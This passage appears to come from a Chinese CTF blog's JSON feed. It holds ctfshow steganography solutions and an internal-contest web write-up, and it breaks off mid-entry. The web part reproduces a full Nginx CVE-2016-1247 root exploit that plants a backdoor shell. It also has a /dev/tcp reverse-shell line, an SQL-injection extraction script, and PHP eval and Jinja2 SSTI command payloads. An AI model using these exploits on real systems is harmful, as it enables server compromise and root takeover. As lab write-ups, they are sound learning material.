9 13 0 13 6 0 10 9 2 1 0 1 10 8 11 5 12 7 2 2 3 10</code></p>\n<p>用小脚本跑一下</p>\n<pre><code class=\"python\">s = '0 12 11 0 7 10 13 13 9 0 9 13 0 13 6 0 10 9 2 1 0 1 10 8 11 5 12 7 2 2 3 10'\nd = '0123456789abcdef'\nfor i in s.split(' '):\n    print(d[int(i)],end='')\n</code></pre>\n<p><code>0cb07add909d0d60a92101a8b5c7223a</code></p>\n<p><code>ctfshow{0cb07add909d0d60a92101a8b5c7223a}</code></p>\n<h2 id=\"misc49\"><a href=\"#misc49\" class=\"headerlink\" title=\"misc49\"></a>misc49</h2><p>用010editor打开，能看到很多字符串</p>\n<p>重点是这些字符串前面，都出现过FFE? 这种格式的数据，搜索一下发现有挺多的</p>\n<p>把所有十六进制数保存在1.txt中，用一个小脚本处理一下</p>\n<p>如果带有\\x，在记事本中直接替换掉所有的即可。</p>\n<pre><code class=\"python\">f=open(\"1.txt\",\"r\")\ntxt=f.read().replace(\"\\n\",\"\")\nf.close()\n\nl=txt.split(\"FFE\")\nflag=\"\"\nfor i in range(1,len(l)):\n    flag += l[i][0]\nprint(flag.lower()[:32]) #结果套上ctfshow{}\n</code></pre>\n<p>其实就是把FFE后面的那个字符提取出来，再连接在一起，一共32位()，这就是flag。</p>\n<p><code>ctfshow{0c618671a153f5da3948fdb2a2238e44}</code></p>\n<h1 id=\"图片篇-颜色通道\"><a href=\"#图片篇-颜色通道\" class=\"headerlink\" title=\"图片篇(颜色通道)\"></a>图片篇(颜色通道)</h1><h2 id=\"misc50\"><a href=\"#misc50\" class=\"headerlink\" title=\"misc50\"></a>misc50</h2><p>StegSolve打开</p>\n<p>调整颜色通道，发现在red1,green0,blue2有flag的图片，</p>\n<p>拼合flag的信息，得到</p>\n<p><code>ctfshow{84470883ee1eec2e886436461bf79111}</code></p>\n<h2 id=\"misc51\"><a href=\"#misc51\" class=\"headerlink\" title=\"misc51\"></a>misc51</h2><pre><code class=\"python\">from PIL import Image\nim=Image.open('misc51.png')\nim = im.convert('RGB')\nimg = Image.new(\"RGB\",(900,150))\n\ndic = {}\n\nfor h in range(900):\n    for w in range(150):\n        s = im.getpixel((h,w))\n        dic[s] = dic.get(s,0)+1\nlt = list(dic.items())\nlt.sort(key = lambda x:x[-1])\nprint(lt)\n</code></pre>\n<pre><code class=\"python\">from PIL import Image\nim=Image.open('misc51.png')\nim = im.convert('RGB')\nimg = Image.new(\"RGB\",(900,150))\n\nfor h in range(900):\n    for w in range(150):\n        s = im.getpixel((h,w))\n        if s == (64, 96, 128) or s == (128, 96, 64):\n            img.putpixel([h, w], (255, 255, 255))\nimg.show()\n</code></pre>\n<p><code>ctfshow{51fcc6228d768a3acab1d05572e52133}</code></p>\n<h2 id=\"misc52\"><a href=\"#misc52\" class=\"headerlink\" title=\"misc52\"></a>misc52</h2><pre><code class=\"python\">from PIL import Image\nim=Image.open('misc52.png')\nim = im.convert('RGB')\nimg = Image.new(\"RGB\",(900,150))\nlt = [(130, 176, 116),(72, 217, 123),(146, 16, 141),(130, 241, 105),(251, 160, 136),(5, 129, 88),(167, 46, 187),(20, 65, 141),(96, 231, 225),(196, 144, 18)]\nfor h in range(900):\n    for w in range(150):\n        s = im.getpixel((h,w))\n        if s in lt:\n            img.putpixel([h, w], (255, 255, 255))\nimg.show()\n</code></pre>\n<p><code>ctfshow{f87ad503c2c163471fbe768c9d7a9d6c}</code></p>\n<h2 id=\"misc53\"><a href=\"#misc53\" class=\"headerlink\" title=\"misc53\"></a>misc53</h2><p>LSB</p>\n<p>StegSolve</p>\n<p>000,RGB,Row</p>\n<pre><code class=\"raw\">63746673686f777b 3639383330643561  ctfshow{ 69830d5a\n3361336235303036 6637623131313933  3a3b5006 f7b11193\n6539626332326132 7dffffffffffffff  e9bc22a2 }.......\n</code></pre>\n<p><code>ctfshow{69830d5a3a3b5006f7b11193e9bc22a2}</code></p>\n<h2 id=\"misc54\"><a href=\"#misc54\" class=\"headerlink\" title=\"misc54\"></a>misc54</h2><p>LSB</p>\n<p>参数改为</p>\n<p>MSB,BRG,Column，alpha:0,green:0,blue:0</p>\n<pre><code class=\"raw\">63746673686f777b 6231663861623234  ctfshow{ b1f8ab24\n6238636132323364 3061666662663337  b8ca223d 0affbf37\n3262613065346661 7dffffffffffffff  2ba0e4fa }.......\n</code></pre>\n<p><code>ctfshow{b1f8ab24b8ca223d0affbf372ba0e4fa}</code></p>\n<h2 id=\"misc55\"><a href=\"#misc55\" class=\"headerlink\" title=\"misc55\"></a>misc55</h2><p>图片反转</p>\n<pre><code class=\"python\">from PIL import Image\n\nimg = Image.open('misc55.png')\n\nimg.transpose(Image.FLIP_TOP_BOTTOM).save('out.png')\n</code></pre>\n<p>rgb,000,column,lsb,得到</p>\n<p><code>PK</code>头，保存，另存为一个压缩包文件</p>\n<p>解压得到<code>旗子</code>文件，打开得到flag</p>\n<p><code>ctfshow{daf256838e19a19d9e7b0a69642ad5ee}</code></p>\n<h2 id=\"misc56\"><a href=\"#misc56\" class=\"headerlink\" title=\"misc56\"></a>misc56</h2><p>StegSolve打开,可以看到通道R4、R2、R1，G4、G2、G1有隐写痕迹</p>\n<p>RGB,Row，MSB，</p>\n<pre><code class=\"raw\">63746673686f777b 3162333063323861  ctfshow{ 1b30c28a\n3566636136636563 3538383662316432  5fca6cec 5886b1d2\n6363386231323633 7dffffffffffffff  cc8b1263 }.......\n</code></pre>\n<p><code>ctfshow{1b30c28a5fca6cec5886b1d2cc8b1263}</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/cf9eb9c9/",
            "url": "http://dpm12345.cn/posts/cf9eb9c9/",
            "title": "内部赛",
            "date_published": "2022-10-04T15:38:40.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>进入后，发现是一个登录界面，很明显为sql注入，访问<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56aXDlvpfliLDmupDnoIFsb2dpbi5waHAv\">www.zip得到源码login.php</span></p>\n<p>login.php</p>\n<pre><code class=\"php\">&lt;?php\nfunction check($arr){\nif(preg_match(\"/load|and|or|\\||\\&amp;|select|union|\\'|=| |\\\\\\|,|sleep|ascii/i\",$arr)){// 过滤了 and、or、'、select，                  \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// 那么在此处行不通\n            echo \"&lt;script&gt;alert('bad hacker!')&lt;/script&gt;\";\n           die();   \n       }\nelse{\n    return true;\n}\n}\nsession_start();\ninclude('db.php');\nif(isset($_POST['e'])&amp;&amp;isset($_POST['p']))\n{\n$e=$_POST['e'];\n$p=$_POST['p'];\n$sql =\"select username from test1 where email='$e' and password='$p'\";//sql 语句\nif(check($e)&amp;&amp;check($p)){\n$result=mysqli_query($con,$sql);\n$row = mysqli_fetch_assoc($result);\n    if($row){ \n        $_SESSION['u']=$row['username'];\n        header('location:user.php');// 跳转到 user.php\n    }\n    else {\n        echo \"&lt;script&gt;alert('Wrong username or password')&lt;/script&gt;\";\n    }\n}\n}\n \n?&gt;\n</code></pre>\n<p>register.php</p>\n<pre><code class=\"php\">&lt;?php\nfunction check($arr){\nif(preg_match(\"/load|and|\\||\\&amp;| |\\\\\\|sleep|ascii|if/i\",$arr)){// 没有过滤分号，也没有过滤查询，可以尝试 sql 注入\n            echo \"&lt;script&gt;alert('bad hacker!')&lt;/script&gt;\";\n           die();   \n       }\nelse{\n    return true;\n}\n}\n\ninclude('db.php');\nif(isset($_POST['e'])&amp;&amp;isset($_POST['u'])&amp;&amp;isset($_POST['p']))\n{\n$e=$_POST['e'];\n$u=$_POST['u'];\n$p=$_POST['p'];\n$sql =\n\"insert into test1\nset email = '$e', \nusername = '$u',\npassword = '$p'\n\";\t\t\t\t// 由代码，此处可以采用 insert 注入\nif(check($e)&amp;&amp;check($u)&amp;&amp;check($p)){\nif(mysqli_query($con, $sql))\n{\nheader('location:login.php');\n}\n}\n}\n \n?&gt;\n</code></pre>\n<p>user.php</p>\n<pre><code class=\"php\">&lt;?php\ninclude('db.php');\nsession_start();\nerror_reporting(0);\nif($_SESSION['u']){\n$username=$_SESSION['u'];\n\nif (is_numeric($username)) \t\t// 查询结果需要为数字\n    {\t\n        if(strlen($username)&gt;10) {\n            $username=substr($username,0,10);\t// 只会取十位的结果，因此需要不断地查找访问\n        }\n        echo \"Hello $username,there's nothing here but dog food!\";\n    }\n    else{\n        echo \"&lt;script&gt;alert('The username can only be a number.How did you get here?go out!!!');location.href='login.php';&lt;/script&gt;\";\n}\n}\nelse{\n        echo \"&lt;script&gt;alert('Login first!');location.href='login.php';&lt;/script&gt;\";\n}\n?&gt;\n</code></pre>\n<p>读过代码后，可以确认可以进行 insert 注入</p>\n<p>需要解决的问题</p>\n<ol>\n<li><p>sql语句为<code>$sql =\"select username from test1 where email='$e' and password='$p'\"</code></p>\n<p>而最后显示的是username，那么可以将username变为sql查询语句，从而获取登陆成功后的返回值</p>\n</li>\n<li><p>由于代码中<code>$username='$u'</code>，所以为了正常，使得u以<code>0'+</code>开始，’0 结束使得最后的插入的语句为<code>’0‘+ 查询语句 +'0'</code>, 语句不会发生语法错误</p>\n</li>\n<li><p>由于每次只能显示 10 位，那么需要进行多次查询，第一次查前 10，再查 10~20，直至查完</p>\n</li>\n<li><p>re.findall(pattern, string, flags=0)</p>\n<p>查询 str 里满足 pattern 的匹配的全部字符串</p>\n<p>其中有两种形式</p>\n<p>如果是 Hello (.*), ，那么只会返回括号里的内容</p>\n<p>如果没有括号，会返回整个，而对于我们来说，只需要 username 即可</p>\n</li>\n</ol>\n<p>因此脚本为</p>\n<pre><code class=\"python\">import requests\nimport re\n\nurl_l = \"http://a8848a6d-ac93-4c3c-aa6e-16af71df7eea.challenge.ctf.show/login.php\"\nurl_r = \"http://a8848a6d-ac93-4c3c-aa6e-16af71df7eea.challenge.ctf.show/register.php\"\n\nflag = \"\"\n\nfor i in range(1, 100):\n\n    #payload = \"'+substr(hex(hex((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()))),({}-1)*10+1,10)+'\".format(i)\n    #payload = \"0'+substr(hex(hex((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'))),({}-1)*10+1,10)+'0\".format(i)\n    #payload = \"0'+substr(hex(hex((select/**/*/**/from/**/flag))),({}-1)*10+1,10)+'0\".format(i)\n\n    emil = \"{}@3\".format(i)\n    print\n\n    data = {\n        \"e\": emil,\n        \"u\": payload,\n        \"p\": 1\n    }\n    data1 = {\n        \"e\": emil,\n        \"p\": 1\n    }\n\n    requests.post(url_r, data=data)\n\n    r = requests.post(url_l, data=data1)\n\n    flag += re.findall(\"Hello (.*),\", r.text)[0]\n\n    print(flag)\n</code></pre>\n<p>先得到表名，<code>363636433631363732433735373336353732</code></p>\n<p>解码为<code>flag,user</code></p>\n<p>再得到字段名<code>3636364336313637</code></p>\n<p>解码为<code>flag</code></p>\n<p>再查询<code>flag</code></p>\n<p>得到 <code>363337343636373336383646373737423337333433373334333733383331333932443338333633343333324433343331363336313244363133373330333432443335333033343631333833363634333736313631363336353744</code></p>\n<p>解码为<code>ctfshow{74747819-8643-41ca-a704-504a86d7aace}</code></p>\n<h2 id=\"出题人不想跟你说话-jpg\"><a href=\"#出题人不想跟你说话-jpg\" class=\"headerlink\" title=\"出题人不想跟你说话.jpg\"></a>出题人不想跟你说话.jpg</h2><p>看到标题及图片中的”cai”，尝试菜刀连接，密码为”cai”</p>\n<p>成功连接，查看目录文件，在根目录找到 flag 文件，但权限不足，无法查看，所以这里需要提权</p>\n<p><code>lsb_release -a</code>，列出所有linux系统版本信息<br><code>nginx -v</code>，列出nginx版本信息</p>\n<p>得到</p>\n<pre><code class=\"raw\">Ubuntu 14.04.5 LTS\nnginx/1.4.6 (Ubuntu)\n</code></pre>\n<p>这里使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VlYnVnLm9yZy92dWxkYi9zc3ZpZC05MjUzOA==\">Nginx 权限提升漏洞 (CVE-2016-1247)</span></p>\n<p>按照漏洞说明及脚本，编写<code>nginx.sh</code>(在linux环境下编写,保持行尾符为LF)，并上传到网站根目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL25naW54LnNoLw==\">nginx.sh</span></p>\n<pre><code class=\"bash\">#!/bin/bash\n#\n# Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit\n# nginxed-root.sh (ver. 1.0)\n#\n# CVE-2016-1247\n#\n# Discovered and coded by:\n#\n# Dawid Golunski\n# dawid[at]legalhackers.com\n#\n# https://legalhackers.com\n#\n# Follow https://twitter.com/dawid_golunski for updates on this advisory.\n#\n# ---\n# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu\n# etc.) to escalate their privileges from nginx web server user (www-data) to root \n# through unsafe error log handling.\n#\n# The exploit waits for Nginx server to be restarted or receive a USR1 signal.\n# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)\n# script which is called daily by the cron.daily on default installations.\n# The restart should take place at 6:25am which is when cron.daily executes.\n# Attackers can therefore get a root shell automatically in 24h at most without any admin\n# interaction just by letting the exploit run till 6:25am assuming that daily logrotation \n# has been configured. \n#\n#\n# Exploit usage:\n# ./nginxed-root.sh path_to_nginx_error.log \n#\n# To trigger logrotation for testing the exploit, you can run the following command:\n#\n# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx\n#\n# See the full advisory for details at:\n# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html\n#\n# Video PoC:\n# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html\n#\n#\n# Disclaimer:\n# For testing purposes only. Do no harm.\n#\n\nBACKDOORSH=\"/bin/bash\"\nBACKDOORPATH=\"/tmp/nginxrootsh\"\nPRIVESCLIB=\"/tmp/privesclib.so\"\nPRIVESCSRC=\"/tmp/privesclib.c\"\nSUIDBIN=\"/usr/bin/sudo\"\n\nfunction cleanexit {\n    # Cleanup \n    echo -e \"\\n[+] Cleaning up...\"\n    rm -f $PRIVESCSRC\n    rm -f $PRIVESCLIB\n    rm -f $ERRORLOG\n    touch $ERRORLOG\n    if [ -f /etc/ld.so.preload ]; then\n        echo -n &gt; /etc/ld.so.preload\n    fi\n    echo -e \"\\n[+] Job done. Exiting with code $1 \\n\"\n    exit $1\n}\n\nfunction ctrl_c() {\n        echo -e \"\\n[+] Ctrl+C pressed\"\n    cleanexit 0\n}\n\n#intro \n\ncat &lt;&lt;_eascii_\n _______________________________\n&lt; Is your server (N)jinxed ? ;o &gt;\n -------------------------------\n           \\ \n            \\          __---__\n                    _-       /--______\n               __--( /     \\ )XXXXXXXXXXX\\v.  \n             .-XXX(   O   O  )XXXXXXXXXXXXXXX- \n            /XXX(       U     )        XXXXXXX\\ \n          /XXXXX(              )--_  XXXXXXXXXXX\\ \n         /XXXXX/ (      O     )   XXXXXX   \\XXXXX\\ \n         XXXXX/   /            XXXXXX   \\__ \\XXXXX\n         XXXXXX__/          XXXXXX         \\__----&gt;\n ---___  XXX__/          XXXXXX      \\__         /\n   \\-  --__/   ___/\\  XXXXXX            /  ___--/=\n    \\-\\    ___/    XXXXXX              '--- XXXXXX\n       \\-\\/XXX\\ XXXXXX                      /XXXXX\n         \\XXXXXXXXX   \\                    /XXXXX/\n          \\XXXXXX      &gt;                 _/XXXXX/\n            \\XXXXX--__/              __-- XXXX/\n             -XXXXXXXX---------------  XXXXXX-\n                \\XXXXXXXXXXXXXXXXXXXXXXXXXX/\n                  \"\"VXXXXXXXXXXXXXXXXXXV\"\"\n_eascii_\n\necho -e \"\\033[94m \\nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \\nnginxed-root.sh (ver. 1.0)\\n\"\necho -e \"Discovered and coded by: \\n\\nDawid Golunski \\nhttps://legalhackers.com \\033[0m\"\n\n# Args\nif [ $# -lt 1 ]; then\n    echo -e \"\\n[!] Exploit usage: \\n\\n$0 path_to_error.log \\n\"\n    echo -e \"It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\\n\"\n    exit 3\nfi\n\n# Priv check\n\necho -e \"\\n[+] Starting the exploit as: \\n\\033[94m`id`\\033[0m\"\nid | grep -q www-data\nif [ $? -ne 0 ]; then\n    echo -e \"\\n[!] You need to execute the exploit as www-data user! Exiting.\\n\"\n    exit 3\nfi\n\n# Set target paths\nERRORLOG=\"$1\"\nif [ ! -f $ERRORLOG ]; then\n    echo -e \"\\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\\n\"\n    exit 3\nfi\n\n# [ Exploitation ]\n\ntrap ctrl_c INT\n# Compile privesc preload library\necho -e \"\\n[+] Compiling the privesc shared library ($PRIVESCSRC)\"\ncat &lt;&lt;_solibeof_&gt;$PRIVESCSRC\n#define _GNU_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;dlfcn.h&gt;\n       #include &lt;sys/types.h&gt;\n       #include &lt;sys/stat.h&gt;\n       #include &lt;fcntl.h&gt;\n\nuid_t geteuid(void) {\n    static uid_t  (*old_geteuid)();\n    old_geteuid = dlsym(RTLD_NEXT, \"geteuid\");\n    if ( old_geteuid() == 0 ) {\n        chown(\"$BACKDOORPATH\", 0, 0);\n        chmod(\"$BACKDOORPATH\", 04777);\n        unlink(\"/etc/ld.so.preload\");\n    }\n    return old_geteuid();\n}\n_solibeof_\n/bin/bash -c \"gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl\"\nif [ $? -ne 0 ]; then\n    echo -e \"\\n[!] Failed to compile the privesc lib $PRIVESCSRC.\"\n    cleanexit 2;\nfi\n\n\n# Prepare backdoor shell\ncp $BACKDOORSH $BACKDOORPATH\necho -e \"\\n[+] Backdoor/low-priv shell installed at: \\n`ls -l $BACKDOORPATH`\"\n\n# Safety check\nif [ -f /etc/ld.so.preload ]; then\n    echo -e \"\\n[!] /etc/ld.so.preload already exists. Exiting for safety.\"\n    exit 2\nfi\n\n# Symlink the log file\nrm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOG\nif [ $? -ne 0 ]; then\n    echo -e \"\\n[!] Couldn't remove the $ERRORLOG file or create a symlink.\"\n    cleanexit 3\nfi\necho -e \"\\n[+] The server appears to be \\033[94m(N)jinxed\\033[0m (writable logdir) ! :) Symlink created at: \\n`ls -l $ERRORLOG`\"\n\n# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered\ncurl http://localhost/ &gt;/dev/null 2&gt;/dev/null\n# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily \n# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)\necho -ne \"\\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...\"\nwhile :; do \n    sleep 1\n    if [ -f /etc/ld.so.preload ]; then\n        echo $PRIVESCLIB &gt; /etc/ld.so.preload\n        rm -f $ERRORLOG\n        break;\n    fi\ndone\n\n# /etc/ld.so.preload should be owned by www-data user at this point\n# Inject the privesc.so shared library to escalate privileges\necho $PRIVESCLIB &gt; /etc/ld.so.preload\necho -e \"\\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \\n`ls -l /etc/ld.so.preload`\"\necho -e \"\\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload\"\necho -e \"\\n[+] The /etc/ld.so.preload file now contains: \\n`cat /etc/ld.so.preload`\"\nchmod 755 /etc/ld.so.preload\n\n# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)\necho -e \"\\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!\"\nsudo 2&gt;/dev/null &gt;/dev/null\n\n# Check for the rootshell\nls -l $BACKDOORPATH\nls -l $BACKDOORPATH | grep rws | grep -q root\nif [ $? -eq 0 ]; then \n    echo -e \"\\n[+] Rootshell got assigned root SUID perms at: \\n`ls -l $BACKDOORPATH`\"\n    echo -e \"\\n\\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\\033[0m\"\nelse\n    echo -e \"\\n[!] Failed to get root\"\n    cleanexit 2\nfi\n\nrm -f $ERRORLOG\necho &gt; $ERRORLOG\n\n# Use the rootshell to perform cleanup that requires root privilges\n$BACKDOORPATH -p -c \"rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB\"\n# Reset the logging to error.log\n$BACKDOORPATH -p -c \"kill -USR1 `pidof -s nginx`\"\n\n# Execute the rootshell\necho -e \"\\n[+] Spawning the rootshell $BACKDOORPATH now! \\n\"\n$BACKDOORPATH -p -i\n\n# Job done.\ncleanexit 0\n</code></pre>\n<p>之后写命令</p>\n<p>反弹 shell</p>\n<pre><code class=\"bash\">在服务器\nnc -lvnp 20000(监听端口)\n在菜刀的虚拟终端\nbash -i bash -i &gt;&amp; /dev/tcp/addr(服务器ip)/port(监听端口) 0&gt;&amp;1\n</code></pre>\n<p>反弹成功</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_1.jpg\"></p>\n<p>反弹成功后，在网站根目录下执行以下命令</p>\n<pre><code class=\"bash\">chmod a+rwx nginx.sh\n./nginx.sh\n./nginx.sh /var/log/nginx/error.log\n</code></pre>\n<p>等待</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_2.jpg\"></p>\n<p>待漏洞触发时，拿到 flag</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_3.jpg\"></p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_4.jpg\"></p>\n<h2 id=\"登陆就有-flag\"><a href=\"#登陆就有-flag\" class=\"headerlink\" title=\"登陆就有 flag\"></a>登陆就有 flag</h2><p>MySQL弱类型转换</p>\n<p>空异或0会查到所有非数字开头的记录，转换一下还有好几种结果：</p>\n<pre><code class=\"raw\">'^0#   '^''#\n</code></pre>\n<h2 id=\"签退\"><a href=\"#签退\" class=\"headerlink\" title=\"签退\"></a>签退</h2><p>这里主要用到了eval函数的功能</p>\n<p>它会将参数作文php代码运行</p>\n<p>那么源码中的<code>\"$$S\"</code> 要想办法绕过第一个<code>$</code>, 因为肯定没有名为传入值的变量的</p>\n<p>这里可以将传入值用分号分隔</p>\n<p>如<code>?S=a;system('ls');</code></p>\n<p>那么进行eval函数时，为<code>$a;system('ls');</code>, 很明显可以作为php语句执行，先创建变量，然后执行<code>system</code>函数</p>\n<p>输入<code>S=a;system('ls');</code></p>\n<p>只有index.php，那么转为显示根目录<code>S=a;system('ls /');</code></p>\n<p>尝试进入目录<code>/var</code>, 即 <code>S=a;system('ls /var');</code></p>\n<p>发现flag.txt，payload:<code>?S=a;system('cat /var/flag.txt');</code></p>\n<p>得到 flag</p>\n<h2 id=\"蓝瘦\"><a href=\"#蓝瘦\" class=\"headerlink\" title=\"蓝瘦\"></a>蓝瘦</h2><p>ssti注入</p>\n<p>抓包，修改 session 值为 {“username ：‘admin’”}，（加密后）</p>\n<p>加密解密脚本</p>\n<pre><code class=\"python\">\"\"\" Flask Session Cookie Decoder/Encoder \"\"\"\n__author__ = 'Wilson Sumanang, Alexandre ZANNI'\n\n# standard imports\nimport sys\nimport zlib\nfrom itsdangerous import base64_decode\nimport ast\n\n# Abstract Base Classes (PEP 3119)\nif sys.version_info[0] &lt; 3:  # &lt; 3.0\n    raise Exception('Must be using at least Python 3')\nelif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4\n    from abc import ABCMeta, abstractmethod\nelse:  # &gt; 3.4\n    from abc import ABC, abstractmethod\n\n# Lib for argument parsing\nimport argparse\n\n# external Imports\nfrom flask.sessions import SecureCookieSessionInterface\n\n\nclass MockApp(object):\n\n    def __init__(self, secret_key):\n        self.secret_key = secret_key\n\n\nif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4\n    class FSCM(metaclass=ABCMeta):\n        def encode(secret_key, session_cookie_structure):\n            \"\"\" Encode a Flask session cookie \"\"\"\n            try:\n                app = MockApp(secret_key)\n\n                session_cookie_structure = dict(\n                    ast.literal_eval(session_cookie_structure))\n                si = SecureCookieSessionInterface()\n                s = si.get_signing_serializer(app)\n\n                return s.dumps(session_cookie_structure)\n            except Exception as e:\n                return \"[Encoding error] {}\".format(e)\n                raise e\n\n        def decode(session_cookie_value, secret_key=None):\n            \"\"\" Decode a Flask cookie  \"\"\"\n            try:\n                if(secret_key == None):\n                    compressed = False\n                    payload = session_cookie_value\n\n                    if payload.startswith('.'):\n                        compressed = True\n                        payload = payload[1:]\n\n                    data = payload.split(\".\")[0]\n\n                    data = base64_decode(data)\n                    if compressed:\n                        data = zlib.decompress(data)\n\n                    return data\n                else:\n                    app = MockApp(secret_key)\n\n                    si = SecureCookieSessionInterface()\n                    s = si.get_signing_serializer(app)\n\n                    return s.loads(session_cookie_value)\n            except Exception as e:\n                return \"[Decoding error] {}\".format(e)\n                raise e\nelse:  # &gt; 3.4\n    class FSCM(ABC):\n        def encode(secret_key, session_cookie_structure):\n            \"\"\" Encode a Flask session cookie \"\"\"\n            try:\n                app = MockApp(secret_key)\n\n                session_cookie_structure = dict(\n                    ast.literal_eval(session_cookie_structure))\n                si = SecureCookieSessionInterface()\n                s = si.get_signing_serializer(app)\n\n                return s.dumps(session_cookie_structure)\n            except Exception as e:\n                return \"[Encoding error] {}\".format(e)\n                raise e\n\n        def decode(session_cookie_value, secret_key=None):\n            \"\"\" Decode a Flask cookie  \"\"\"\n            try:\n                if(secret_key == None):\n                    compressed = False\n                    payload = session_cookie_value\n\n                    if payload.startswith('.'):\n                        compressed = True\n                        payload = payload[1:]\n\n                    data = payload.split(\".\")[0]\n\n                    data = base64_decode(data)\n                    if compressed:\n                        data = zlib.decompress(data)\n\n                    return data\n                else:\n                    app = MockApp(secret_key)\n\n                    si = SecureCookieSessionInterface()\n                    s = si.get_signing_serializer(app)\n\n                    return s.loads(session_cookie_value)\n            except Exception as e:\n                return \"[Decoding error] {}\".format(e)\n                raise e\n\n\nif __name__ == \"__main__\":\n    # Args are only relevant for __main__ usage\n\n    # Description for help\n    parser = argparse.ArgumentParser(\n        description='Flask Session Cookie Decoder/Encoder',\n        epilog=\"Author : Wilson Sumanang, Alexandre ZANNI\")\n\n    # prepare sub commands\n    subparsers = parser.add_subparsers(\n        help='sub-command help', dest='subcommand')\n\n    # create the parser for the encode command\n    parser_encode = subparsers.add_parser('encode', help='encode')\n    parser_encode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;',\n                               help='Secret key', required=True)\n    parser_encode.add_argument('-t', '--cookie-structure', metavar='&lt;string&gt;',\n                               help='Session cookie structure', required=True)\n\n    # create the parser for the decode command\n    parser_decode = subparsers.add_parser('decode', help='decode')\n    parser_decode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;',\n                               help='Secret key', required=False)\n    parser_decode.add_argument('-c', '--cookie-value', metavar='&lt;string&gt;',\n                               help='Session cookie value', required=True)\n\n    # get args\n    args = parser.parse_args()\n\n    # find the option chosen\n    if(args.subcommand == 'encode'):\n        if(args.secret_key is not None and args.cookie_structure is not None):\n            print(FSCM.encode(args.secret_key, args.cookie_structure))\n    elif(args.subcommand == 'decode'):\n        if(args.secret_key is not None and args.cookie_value is not None):\n            print(FSCM.decode(args.cookie_value, args.secret_key))\n        elif(args.cookie_value is not None):\n            print(FSCM.decode(args.cookie_value))\n</code></pre>\n<p>后面为ssti注入</p>\n<p><code>?ctfshow={{''.__class__.__mro__[1].__subclasses__()[66].__init__.__globals__[\"__builtins__\"].eval('__import__(\"os\").popen(\"ls\").read()')}}</code></p>\n<p>返回正常，想访问内部文件，无果</p>\n<p>flag 在内存 (查阅资料)</p>\n<p>试着读取环境变量</p>\n<p><code>{{''.__class__.__mro__[1].__subclasses__()[66].__init__.__globals__[\"__builtins__\"].eval('__import__(\"os\").popen(\"env\").read()')}}</code></p>\n<h2 id=\"一览无余\"><a href=\"#一览无余\" class=\"headerlink\" title=\"一览无余\"></a>一览无余</h2><p>一览无余（需要再次学习）直接看wp发现为<code>CVE-2019-11043</code><br>利用工具：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25lZXgvcGh1aXAtZnBpemRhbQ==\">PHuiP-FPizdaM</span></p>\n<h3 id=\"安装过程\"><a href=\"#安装过程\" class=\"headerlink\" title=\"安装过程:\"></a>安装过程:</h3><h4 id=\"1-安装go环境-如果没有的话\"><a href=\"#1-安装go环境-如果没有的话\" class=\"headerlink\" title=\"1. 安装go环境 (如果没有的话)\"></a>1. 安装go环境 (如果没有的话)</h4><pre><code class=\"bash\">root全县辖\napt-get update\napt install gccgo-go\napt install golang-go\n途中一直回车\n</code></pre>\n<h4 id=\"2-安装phuip-fpizdam\"><a href=\"#2-安装phuip-fpizdam\" class=\"headerlink\" title=\"2. 安装phuip-fpizdam\"></a>2. 安装phuip-fpizdam</h4><pre><code class=\"bash\">git clone https://github.com/neex/phuip-fpizdam.git phuip-fpizdam\ncd phuip-fpizdam\ngo get -v &amp;&amp; go build 或 go install phuip-fpizdam\n</code></pre>\n<p>若出现</p>\n<pre><code class=\"raw\">go: 